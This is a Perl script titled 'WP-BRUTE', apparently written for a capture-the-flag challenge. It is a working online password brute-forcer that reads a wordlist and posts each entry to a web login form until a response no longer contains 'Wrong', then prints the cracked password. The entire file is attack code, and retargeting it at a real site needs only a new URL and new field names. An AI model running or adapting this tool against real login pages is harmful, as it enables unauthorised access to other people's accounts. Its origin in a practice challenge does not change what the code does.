#!/usr/bin/perl

# WP-BRUTE BY MMXM
# Gr33tz To Cy¢lone & Ut0p|4

use LWP::UserAgent;

my $site ='http://game.rop.sh/chall/5/';
$wordl = $ARGV[0];

my $a;

open($a,"<$wordl") or die "$!";
my $word;

print "\n\n\n$_:\n\nAttacking...\n\n";
sleep(5);
my $count=0;
my $passNumber=$ARGV[1];
if ($passNumber!=0){
	print "Strat==>$passNumber";
while(my$data=<$a>){
chomp($data);
++$count;
if($count>$passNumber){
sleep(0.5);
my $ua = new LWP::UserAgent;

my $response = $ua->post($site, {password=>$data ,submit=>'Enter'});

my $code = $response->content;
	
my $r=$response->content;
my $w;
	$w=$response->code;
if($code=~/^Wrong/&&$w==200){  
   
   my $e=length($data);
   
   print"[$count]";
   print "[+] Testing... $data";
   print "[$e]";
   print "\t\t\t[$code]\n";
   
}
			
if($r!~m/Wrong/){
print "\n\n\t[*] PASSWORD CRACKED: $data \t$r\n\n";
exit;
}
}
}
}

else{
	my $count=0;
	while(my$data=<$a>){
	chomp($data);
	sleep(0.5);
	
		++$count;
	$ua = new LWP::UserAgent;

 $response = $ua->post($site, {password =>$data ,submit =>'Enter'});

 $code = $response->content;
	
 $r=$response->content;
 $w;
	$w=$response->code;
if($code=~/^Wrong/&&$w==200){
   my $e=length($data);
   
   print"[$count]";
   print "[+] Testing... $data";
   print "[$e]";
   print "\t\t\t[$code]\n";
}

if($r!~m/Wrong/){

print "\n\n\t[*] PASSWORD CRACKED: $data \t  $r\n\n";
exit;
}
}
}
exit;